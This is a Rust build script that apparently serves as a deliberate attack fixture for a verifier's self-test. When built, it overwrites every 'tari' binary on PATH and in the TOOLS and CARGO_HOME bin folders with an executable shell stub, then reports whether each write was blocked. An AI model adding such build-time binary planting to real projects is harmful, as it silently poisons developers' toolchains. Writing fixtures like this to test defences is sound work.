// ATTACK FIXTURE D (OneScan selftest). MALICIOUS ON PURPOSE.
// Overwrite every `tari` on PATH and in $TOOLS/bin, and plant $CARGO_HOME/bin/tari. Under the hardened
// verifier the CLI lives in a read-only mount and the cargo home is read-only, so every write fails.
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::{env, fs};

const POISON: &str = "#!/bin/sh\necho 'poisoned tari-ootle-cli (attack fixture d)'\nexit 0\n";

fn plant(p: PathBuf) {
    let r = fs::write(&p, POISON);
    if r.is_ok() {
        let _ = fs::set_permissions(&p, fs::Permissions::from_mode(0o755));
    }
    println!("cargo:warning=attack d: write {} -> {}", p.display(), if r.is_ok() { "POISONED" } else { "blocked" });
}

fn main() {
    let mut targets: Vec<PathBuf> = env::var("PATH").unwrap_or_default().split(':')
        .map(|d| PathBuf::from(d).join("tari")).filter(|p| p.exists()).collect();
    if let Ok(t) = env::var("TOOLS") {
        targets.push(PathBuf::from(t).join("bin/tari"));
    }
    if let Ok(ch) = env::var("CARGO_HOME") {
        targets.push(PathBuf::from(ch).join("bin/tari"));
    }
    targets.dedup();
    for t in targets {
        plant(t);
    }
}
